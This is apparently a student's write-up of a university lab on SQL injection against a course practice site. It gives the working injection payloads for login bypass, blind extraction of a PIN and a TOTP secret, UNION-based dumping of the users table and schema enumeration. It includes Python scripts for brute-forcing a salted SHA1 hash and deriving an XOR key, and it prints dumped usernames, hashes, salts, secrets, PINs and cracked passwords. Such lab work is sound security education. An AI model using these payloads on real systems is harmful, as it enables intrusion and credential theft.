# SQL Injection

The goal was to hack web application which is vulnerable to SQL Injection. The webpage is: https://kbe.felk.cvut.cz

# 1. Task: Login without password

**Assignment** 
On the main page, there is a login form that you need to pass through, without knowledge of password. As a username use your FEL login name.

**Solution**
I put in `' OR 1=1; #` instead of username and `#` instead of password. The query for login in database is `SELECT username FROM users WHERE username = '$_POST[username]' AND password = SHA1('$_POST[password]' . '$salt')`. When we use a single quote `'` then we close first parameter in query. Next with `OR 1=1;` we say that all is true. Finally, we will comment the rest of query in database.  

_Login_: `' OR 1=1; #`
_Password_: `#`

# 2. Task: Find out your PIN
**Assignment**
As you can see, your account is not only password-protected, but also PIN-protected. Try to find out your PIN using the vulnerability from the previous task.

**Solution**
The pin has 4 digits. I gradually tried to find digit by digit. For this purpose, I used the following function `LEFT(string, length)`, which returns a specified number of characters from the left of the string. For example, for finding the first digit I put in the following text to username `matijmic' AND LEFT(pin, 1) = '0'#` and gradually changed the numbers. The Password was the same as in the previous solution, thus `#`. The digit was found if the login was a success. After finding the first digit, I tried to find the second, third and fourth digits and used a similar principle.

_Login_: `matijmic' AND LEFT(pin, 3) = '860'#`
_Password_: `#`
 _Pin_: **8676**
 
 # 3. Task: Overcome One-Time-Password
**Assignment**
PIN-protection didn't stop you? Easy-peasy? Well, try to defeat the next layer of protection Time-based One-Time Password widely used industry standard for 2-factor authentication.

**Solution**
Firstly, I found out length of secret. The size was 16. Next, I used same method for finding secret as in the previous task(2. task). After finding the secret, I used the following website https://totp.app/ to generate One-Time password.

_Login_: `matijmic' AND LENGTH(secret) = 10#`
_Password_: `#`
_Length of secret_: 16

_Login_: `matijmic' AND LEFT(secret, 1) = '0'#`
_Password_: `#`
_Secret_: **27xsbywhuonpwdfd**

# 4. Task: Exfiltrate a list of all usernames, passwords, salts, secrets and pins
**Assignment**
Bored of reading secret messages? Let's do some harm. What about exfiltrating all data stored in the database?

**Solution**
I used offset and union select for retrieving usernames, paswwords, salts and pins from the users table. Because of the limitation of the number of columns we can select, I used concat function. The result of the select is below in the table.

_Url_: `https://kbe.felk.cvut.cz/index.php?offset=0 union select concat(username, ',', password, ',', salt, ',', secret, ',', pin), 1 from users`

| Username      | Password                                      | Salt  | Secret            | Pin   |
| ---           | ---                                           | ---   | ---               | ---   |
| komartom      | 2d55131b6752f066ee2cc57ba8bf781b4376be85      | kckct | JD5WXOFDCB7CVMMF  | 6607  |
| dzivjmat      | 62814f10dd416b616f733605740304cd87ba7508      | ac598 | 3XLU4LMYWYYNFFW4  | 4425  |
| horovtom      | 8b3a52b2cfdbda9fd2417b3b10ccc7e02c8a4d8e      | f9ca1 | KABBE4IS4GQYD4AJ  | 9907  |
| hulamart      | 026f5211efb57728d3491b795d560ee7504a1de8      | 5651a | OSRPNLI3QB44BCHD  | 6692  |
| jarkoma3      | a3c355724882ab6c8aebed5711a36b26630010e6      | db116 | EY52GXJQICFOWSAY  | 5768  |
| kacenjir      | ff6b008980f05029be1a1b125ca62338c8721aca      | e463d | PBA26N4K2UNVEF5A  | 9815  |
| koubadom      | 7c464e41d5418f13b17bf7b98851b408dcbda7f0      | 6c405 | TWF3PGZ74YFEJGXD  | 0170  |
| kovacj11      | 26f904edbb83aaae75c42abe906631bd1535aabe      | f9718 | PZPSNTWL6HG4WPRE  | 5426  |
| lupennik      | 06581f57702232b0aeda224bd31da52d74b4a8d1      | 54b94 | L4QNDNOAC425AAV4  | 9597  |
| matijmic      | 2655a13f039e9966d590ca8e260cc1a48bf494a6      | 1e09d | 27XSBYWHUONPWDFD  | 8676  |
| mullevik      | d54729441577b071d4762fe4b1d5b837c086800e      | 06c5e | APQTQMJCNQLMPLGY  | 1846  |
| mulleste      | 177996c78b67a7819aa6c519499843f0e7fc63cf      | 978ad | SWONH2FQJ6IKXBS6  | 3819  |
| scupamic      | 97be8007947043126055c9203213d898a82c6cca      | aa7a6 | P3CRVVKDTH44GZV7  | 7780  |
| sinelser      | c524fc7812a556118414e12fc6be9b5ed022cd4f      | c6290 | AWQJITSIA5MZXDBK  | 3043  |
| sojmadmi      | 940b8bb7d2fcca4dcbb4cef4246016cf691b4cd2      | 7f454 | PZXDARUBQUEM2BDF  | 9224  |
| stejspe7      | dd017b8f3bdb9fce4cad84dc87269b12954a1114      | 28af9 | FKEXAA5UF44PDUQZ  | 4650  |
| subikste      | 64bc1ceb141e8963d3b934e4f68995446e561c22      | af8e1 | GVM2WZOOHLOOV4TP  | 4653  |
| trnkavla      | 705529ad29a462e611682176e4c889ba1a392a99      | e1f69 | VXCN2SPHM4YPS7CI  | 4750  |
| vankope6      | 043e058894d0e34d13767d0d976dc1d34766368c      | 7e284 | UNOFIJ3EDBIUNILS  | 2186  |

# 5. Task: Crack your password hash
**Assignment**
Do you want to be able to login as an ordinary user? Well, then you need to know your password in addition to your PIN and SECRET key.

**Solution**
I used a brute-force attack. The whole script is in [lab3.py](lab3.py). Below is part of the script which I used for the solution of 5. task. I knew sha1 hash from previous task(4. task) `2655a13f039e9966d590ca8e260cc1a48bf494a6` and salt `1e09d`. I wrote function `find_passwd()` where I first found all permutation with repetition and following I create a hash of these possible passwords and check against to hash obtained from task 4. 

_Pasword_: **22eac**

```python
import itertools
import hashlib


def tupleToString(tuple):
    str = ''.join(tuple)
    return str


salt = '1e09d'
my_sha1 = "2655a13f039e9966d590ca8e260cc1a48bf494a6"
password_possible_letters = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
         'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'y', 'x', 'z']


def find_passwd():
    possible_passwords = [tupleToString(x) for x in itertools.product(password_possible_letters, repeat=5)]
    password = ""
    print("Permutation with repetition done")

    for p_passd in possible_passwords:
        possible_sha1 = hashlib.sha1((p_passd + salt).encode()).hexdigest()
        if possible_sha1 == my_sha1:
            password = p_passd
            break

    return password


print(find_passwd())
```

# 6. Task: Crack teacher's password hash
**Assignment**
No comment.
⚠️ Warning ⚠️: Do not use brute-force as the password is quite long. Online tools should be sufficient.

**Solution**
I used the following website for finding a password https://hashtoolkit.com/decrypt-hash/?hash=2d55131b6752f066ee2cc57ba8bf781b4376be85

_Password_: **fm9fytmf7q**
_Salt_: kckct
_Url_: https://hashtoolkit.com/decrypt-hash/?hash=2d55131b6752f066ee2cc57ba8bf781b4376be85

# 7. Task: Explain why teacher's password is insecure despite it's length
**Assignment**

**Solution**
I think that uses only lower case characters and numbers are insufficient because password space is only 36 ^ 10. The second problem see that f is mostly repetitive and this to increase the chance of finding a password.

_Password_: **fm9fytmf7q**

# 8. Task: Print a list of all table names and their columns
**Assignment**

**Solution**
I used union select the same as in 4. task. I put in the following union select to URL `union select concat(table_name, ',', table_schema, ',', COLUMN_NAME), 1 FROM INFORMATION_SCHEMA.columns` for retrieving all tables and their columns. We can see the result below in the table.

_Url_: `https://kbe.felk.cvut.cz/index.php?offset=0%20union%20select%20concat(table_name,%20%27,%27,%20table_schema,%20%27,%27,%20COLUMN_NAME),%201%20FROM%20INFORMATION_SCHEMA.columns`

| Table | Schema    | Columns   |
| ---   | ---       | ---       |
|CHARACTER_SETS|information_schema|CHARACTER_SET_NAME - DEFAULT_COLLATE_NAME - DESCRIPTION - MAXLEN|
|COLLATIONS|information_schema|COLLATION_NAME - CHARACTER_SET_NAME - ID - IS_DEFAULT - IS_COMPILED - SORTLEN|
|COLLATION_CHARACTER_SET_APPLICABILITY|information_schema|COLLATION_NAME - CHARACTER_SET_NAME|
|COLUMNS|information_schema|TABLE_CATALOG - TABLE_SCHEMA - TABLE_NAME - COLUMN_NAME - ORDINAL_POSITION - COLUMN_DEFAULT - IS_NULLABLE - DATA_TYPE - CHARACTER_MAXIMUM_LENGTH - CHARACTER_OCTET_LENGTH - NUMERIC_PRECISION - NUMERIC_SCALE - CHARACTER_SET_NAME - COLLATION_NAME - COLUMN_TYPE - COLUMN_KEY - EXTRA - PRIVILEGES - COLUMN_COMMENT|
|COLUMN_PRIVILEGES|information_schema|GRANTEE - TABLE_CATALOG - TABLE_SCHEMA - TABLE_NAME - COLUMN_NAME - PRIVILEGE_TYPE - IS_GRANTABLE|
|ENGINES|information_schema|ENGINE - SUPPORT - COMMENT - TRANSACTIONS - XA - SAVEPOINTS|
|EVENTS|information_schema|EVENT_CATALOG - EVENT_SCHEMA - EVENT_NAME - DEFINER - TIME_ZONE - EVENT_BODY - EVENT_DEFINITION - EVENT_TYPE - EXECUTE_AT - INTERVAL_VALUE - INTERVAL_FIELD - SQL_MODE - STARTS - ENDS - STATUS - ON_COMPLETION - CREATED - LAST_ALTERED - LAST_EXECUTED - EVENT_COMMENT - ORIGINATOR - CHARACTER_SET_CLIENT - COLLATION_CONNECTION - DATABASE_COLLATION|
|FILES|information_schema|FILE_ID - FILE_NAME - FILE_TYPE - TABLESPACE_NAME - TABLE_CATALOG - TABLE_SCHEMA - TABLE_NAME - LOGFILE_GROUP_NAME - LOGFILE_GROUP_NUMBER - ENGINE - FULLTEXT_KEYS - DELETED_ROWS - UPDATE_COUNT - FREE_EXTENTS - TOTAL_EXTENTS - EXTENT_SIZE - INITIAL_SIZE - MAXIMUM_SIZE - AUTOEXTEND_SIZE - CREATION_TIME - LAST_UPDATE_TIME - LAST_ACCESS_TIME - RECOVER_TIME - TRANSACTION_COUNTER - VERSION - ROW_FORMAT - TABLE_ROWS - AVG_ROW_LENGTH - DATA_LENGTH - MAX_DATA_LENGTH - INDEX_LENGTH - DATA_FREE - CREATE_TIME - UPDATE_TIME - CHECK_TIME - CHECKSUM - STATUS - EXTRA|
|GLOBAL_STATUS|information_schema|VARIABLE_NAME - VARIABLE_VALUE|
|GLOBAL_VARIABLES|information_schema|VARIABLE_NAME - VARIABLE_VALUE|
|KEY_COLUMN_USAGE|information_schema|CONSTRAINT_CATALOG - CONSTRAINT_SCHEMA - CONSTRAINT_NAME - TABLE_CATALOG - TABLE_SCHEMA - TABLE_NAME - COLUMN_NAME - ORDINAL_POSITION - POSITION_IN_UNIQUE_CONSTRAINT - REFERENCED_TABLE_SCHEMA - REFERENCED_TABLE_NAME - REFERENCED_COLUMN_NAME|
|PARAMETERS|information_schema|SPECIFIC_CATALOG - SPECIFIC_SCHEMA - SPECIFIC_NAME - ORDINAL_POSITION - PARAMETER_MODE - PARAMETER_NAME - DATA_TYPE - CHARACTER_MAXIMUM_LENGTH - CHARACTER_OCTET_LENGTH - NUMERIC_PRECISION - NUMERIC_SCALE - CHARACTER_SET_NAME - COLLATION_NAME - DTD_IDENTIFIER - ROUTINE_TYPE|
|PARTITIONS|information_schema|TABLE_CATALOG - TABLE_SCHEMA - TABLE_NAME - PARTITION_NAME - SUBPARTITION_NAME - PARTITION_ORDINAL_POSITION - SUBPARTITION_ORDINAL_POSITION - PARTITION_METHOD - SUBPARTITION_METHOD - PARTITION_EXPRESSION - SUBPARTITION_EXPRESSION - PARTITION_DESCRIPTION - TABLE_ROWS - AVG_ROW_LENGTH - DATA_LENGTH - MAX_DATA_LENGTH - INDEX_LENGTH - DATA_FREE - CREATE_TIME - UPDATE_TIME - CHECK_TIME - CHECKSUM - PARTITION_COMMENT - NODEGROUP - TABLESPACE_NAME|
|PLUGINS|information_schema|PLUGIN_NAME - PLUGIN_VERSION - PLUGIN_STATUS - PLUGIN_TYPE - PLUGIN_TYPE_VERSION - PLUGIN_LIBRARY - PLUGIN_LIBRARY_VERSION - PLUGIN_AUTHOR - PLUGIN_DESCRIPTION - PLUGIN_LICENSE - LOAD_OPTION|
|PROCESSLIST|information_schema|ID - USER - HOST - DB - COMMAND - TIME - STATE - INFO|
|PROFILING|information_schema|QUERY_ID - SEQ - STATE - DURATION - CPU_USER - CPU_SYSTEM - CONTEXT_VOLUNTARY - CONTEXT_INVOLUNTARY - BLOCK_OPS_IN - BLOCK_OPS_OUT - MESSAGES_SENT - MESSAGES_RECEIVED - PAGE_FAULTS_MAJOR - PAGE_FAULTS_MINOR - SWAPS - SOURCE_FUNCTION - SOURCE_FILE - SOURCE_LINE|
|REFERENTIAL_CONSTRAINTS|information_schema|CONSTRAINT_CATALOG - CONSTRAINT_SCHEMA - CONSTRAINT_NAME - UNIQUE_CONSTRAINT_CATALOG - UNIQUE_CONSTRAINT_SCHEMA - UNIQUE_CONSTRAINT_NAME - MATCH_OPTION - UPDATE_RULE - DELETE_RULE - TABLE_NAME - REFERENCED_TABLE_NAME|
|ROUTINES|information_schema|SPECIFIC_NAME - ROUTINE_CATALOG - ROUTINE_SCHEMA - ROUTINE_NAME - ROUTINE_TYPE - DATA_TYPE - CHARACTER_MAXIMUM_LENGTH - CHARACTER_OCTET_LENGTH - NUMERIC_PRECISION - NUMERIC_SCALE - CHARACTER_SET_NAME - COLLATION_NAME - DTD_IDENTIFIER - ROUTINE_BODY - ROUTINE_DEFINITION - EXTERNAL_NAME - EXTERNAL_LANGUAGE - PARAMETER_STYLE - IS_DETERMINISTIC - SQL_DATA_ACCESS - SQL_PATH - SECURITY_TYPE - CREATED - LAST_ALTERED - SQL_MODE - ROUTINE_COMMENT - DEFINER - CHARACTER_SET_CLIENT - COLLATION_CONNECTION - DATABASE_COLLATION|
|SCHEMATA|information_schema|CATALOG_NAME - SCHEMA_NAME - DEFAULT_CHARACTER_SET_NAME - DEFAULT_COLLATION_NAME - SQL_PATH|
|SCHEMA_PRIVILEGES|information_schema|GRANTEE - TABLE_CATALOG - TABLE_SCHEMA - PRIVILEGE_TYPE - IS_GRANTABLE|
|SESSION_STATUS|information_schema|VARIABLE_NAME - VARIABLE_VALUE|
|SESSION_VARIABLES|information_schema|VARIABLE_NAME - VARIABLE_VALUE|
|STATISTICS|information_schema|TABLE_CATALOG - TABLE_SCHEMA - TABLE_NAME - NON_UNIQUE - INDEX_SCHEMA - INDEX_NAME - SEQ_IN_INDEX - COLUMN_NAME - COLLATION - CARDINALITY - SUB_PART - PACKED - NULLABLE - INDEX_TYPE - COMMENT - INDEX_COMMENT|
|TABLES|information_schema|TABLE_CATALOG - TABLE_SCHEMA - TABLE_NAME - TABLE_TYPE - ENGINE - VERSION - ROW_FORMAT - TABLE_ROWS - AVG_ROW_LENGTH - DATA_LENGTH - MAX_DATA_LENGTH - INDEX_LENGTH - DATA_FREE - AUTO_INCREMENT - CREATE_TIME - UPDATE_TIME - CHECK_TIME - TABLE_COLLATION - CHECKSUM - CREATE_OPTIONS - TABLE_COMMENT|
|TABLESPACES|information_schema|TABLESPACE_NAME - ENGINE - TABLESPACE_TYPE - LOGFILE_GROUP_NAME - EXTENT_SIZE - AUTOEXTEND_SIZE - MAXIMUM_SIZE - NODEGROUP_ID - TABLESPACE_COMMENT|
|TABLE_CONSTRAINTS|information_schema|CONSTRAINT_CATALOG - CONSTRAINT_SCHEMA - CONSTRAINT_NAME - TABLE_SCHEMA - TABLE_NAME - CONSTRAINT_TYPE|
|TABLE_PRIVILEGES|information_schema|GRANTEE - TABLE_CATALOG - TABLE_SCHEMA - TABLE_NAME - PRIVILEGE_TYPE - IS_GRANTABLE|
|TRIGGERS|information_schema|TRIGGER_CATALOG - TRIGGER_SCHEMA - TRIGGER_NAME - EVENT_MANIPULATION - EVENT_OBJECT_CATALOG - EVENT_OBJECT_SCHEMA - EVENT_OBJECT_TABLE - ACTION_ORDER - ACTION_CONDITION - ACTION_STATEMENT - ACTION_ORIENTATION - ACTION_TIMING - ACTION_REFERENCE_OLD_TABLE - ACTION_REFERENCE_NEW_TABLE - ACTION_REFERENCE_OLD_ROW - ACTION_REFERENCE_NEW_ROW - CREATED - SQL_MODE - DEFINER - CHARACTER_SET_CLIENT - COLLATION_CONNECTION - DATABASE_COLLATION|
|USER_PRIVILEGES|information_schema|GRANTEE - TABLE_CATALOG - PRIVILEGE_TYPE - IS_GRANTABLE|
|VIEWS|information_schema|TABLE_CATALOG - TABLE_SCHEMA - TABLE_NAME - VIEW_DEFINITION - CHECK_OPTION - IS_UPDATABLE - DEFINER - SECURITY_TYPE - CHARACTER_SET_CLIENT - COLLATION_CONNECTION|
|INNODB_BUFFER_PAGE|information_schema|POOL_ID - BLOCK_ID - SPACE - PAGE_NUMBER - PAGE_TYPE - FLUSH_TYPE - FIX_COUNT - IS_HASHED - NEWEST_MODIFICATION - OLDEST_MODIFICATION - ACCESS_TIME - TABLE_NAME - INDEX_NAME - NUMBER_RECORDS - DATA_SIZE - COMPRESSED_SIZE - PAGE_STATE - IO_FIX - IS_OLD - FREE_PAGE_CLOCK|
|INNODB_TRX|information_schema|trx_id - trx_state - trx_started - trx_requested_lock_id - trx_wait_started - trx_weight - trx_mysql_thread_id - trx_query - trx_operation_state - trx_tables_in_use - trx_tables_locked - trx_lock_structs - trx_lock_memory_bytes - trx_rows_locked - trx_rows_modified - trx_concurrency_tickets - trx_isolation_level - trx_unique_checks - trx_foreign_key_checks - trx_last_foreign_key_error - trx_adaptive_hash_latched - trx_adaptive_hash_timeout|
|INNODB_BUFFER_POOL_STATS|information_schema|POOL_ID - POOL_SIZE - FREE_BUFFERS - DATABASE_PAGES - OLD_DATABASE_PAGES - MODIFIED_DATABASE_PAGES - PENDING_DECOMPRESS - PENDING_READS - PENDING_FLUSH_LRU - PENDING_FLUSH_LIST - PAGES_MADE_YOUNG - PAGES_NOT_MADE_YOUNG - PAGES_MADE_YOUNG_RATE - PAGES_MADE_NOT_YOUNG_RATE - NUMBER_PAGES_READ - NUMBER_PAGES_CREATED - NUMBER_PAGES_WRITTEN - PAGES_READ_RATE - PAGES_CREATE_RATE - PAGES_WRITTEN_RATE - NUMBER_PAGES_GET - HIT_RATE - YOUNG_MAKE_PER_THOUSAND_GETS - NOT_YOUNG_MAKE_PER_THOUSAND_GETS - NUMBER_PAGES_READ_AHEAD - NUMBER_READ_AHEAD_EVICTED - READ_AHEAD_RATE - READ_AHEAD_EVICTED_RATE - LRU_IO_TOTAL - LRU_IO_CURRENT - UNCOMPRESS_TOTAL - UNCOMPRESS_CURRENT|
|INNODB_LOCK_WAITS|information_schema|requesting_trx_id - requested_lock_id - blocking_trx_id - blocking_lock_id|
|INNODB_CMPMEM|information_schema|page_size - buffer_pool_instance - pages_used - pages_free - relocation_ops - relocation_time|
|INNODB_CMP|information_schema|page_size - compress_ops - compress_ops_ok - compress_time - uncompress_ops - uncompress_time|
|INNODB_LOCKS|information_schema|lock_id - lock_trx_id - lock_mode - lock_type - lock_table - lock_index - lock_space - lock_page - lock_rec - lock_data|
|INNODB_CMPMEM_RESET|information_schema|page_size - buffer_pool_instance - pages_used - pages_free - relocation_ops - relocation_time|
|INNODB_CMP_RESET|information_schema|page_size - compress_ops - compress_ops_ok - compress_time - uncompress_ops - uncompress_time|
|INNODB_BUFFER_PAGE_LRU|information_schema|POOL_ID - LRU_POSITION - SPACE - PAGE_NUMBER - PAGE_TYPE - FLUSH_TYPE - FIX_COUNT - IS_HASHED - NEWEST_MODIFICATION - OLDEST_MODIFICATION - ACCESS_TIME - TABLE_NAME - INDEX_NAME - NUMBER_RECORDS - DATA_SIZE - COMPRESSED_SIZE - COMPRESSED - IO_FIX - IS_OLD - FREE_PAGE_CLOCK|
|codes|kbe|username - aes_encrypt_code|
|messages|kbe|username - base64_message_xor_key - date_time|
|users|kbe|username - password - pin - secret - salt|


# 9. Task: Derive xor key used for encoding your messages
**Assignment**
As you might have noticed, the secret messages are stored in an encrypted form in the database, but before printing they are decrypted on the backend. Since you have access to both forms of messages, try to derive the xor key used for encoding/decoding your messages.

**Solution**
Firstly, I use the following website https://cryptii.com/pipes/base64-to-hex for decode base64 to hex. Next, I wrote a script for finding the key. Since we know messages and hex-s we can xor character by character thereby we will xor one hex by 256 integers and the result of this xor-s will be equal to one character of the message.

_Url_: https://cryptii.com/pipes/base64-to-hex
_Key_: **xor_key_9517_kbe_2020**

```python
def hex2bin(hex_str):
    return bytes.fromhex(hex_str)


def decrypt(data: bytes, key: str):
    plaintext = ""
    positionInKey = 0
    keySize = len(key)
    for byte in data:
        plaintext = plaintext + chr(byte ^ ord(key[positionInKey]))
        if positionInKey < (keySize - 1):
            positionInKey += 1
        else:
            positionInKey = 0

    return plaintext


def findKey(cipher: bytes, plaintext: str):
    key = ""
    position_plaintext = 0
    for byte in cipher:
        for potential_key in range(256):
            xor_chr = chr(byte ^ potential_key)
            if xor_chr == plaintext[position_plaintext]:
                key += chr(potential_key)
        position_plaintext += 1

    return key


data2 = "440e523719001f621e5c5f533a134c1537420f515f1c0a556123000b3a051a50097f120d107f51515c101e061c3b4b1c162a4b1542523c1e10007f515f565556"
message2 = "<a href='index.php?code'>Here</a> you can find your secure code."
data2Bin = hex2bin(data2)

data3 = "2f0a1e3347450d37584116447f0a0e097f545f4010160005714b360d3e40154542310e0645395d421244100a52310e1d0d7f5a5d505b330e0c023a411e"
message3 = "Well, that's all for now. Stay tuned for the next challenges."
data3Bin = hex2bin(data3)

message1 = "Welcome <b>matijmic</b>, this is your first secret message."
data = "2f0a1e3c04081c7f05570f5a3e1f0b0f325b530e1f1a515e7f1f0d102c195c4217260417177f545940430c4f013a08171c2b195854442c0a050071"
dataBin = hex2bin(data)

print(findKey(dataBin, message1))
print(findKey(data2Bin, message2))
print(findKey(data3Bin, message3))

key = "xor_key_9517_kbe_2020"
print(decrypt(dataBin, key))
print(decrypt(data2Bin, key))
print(decrypt(data3Bin, key))
```
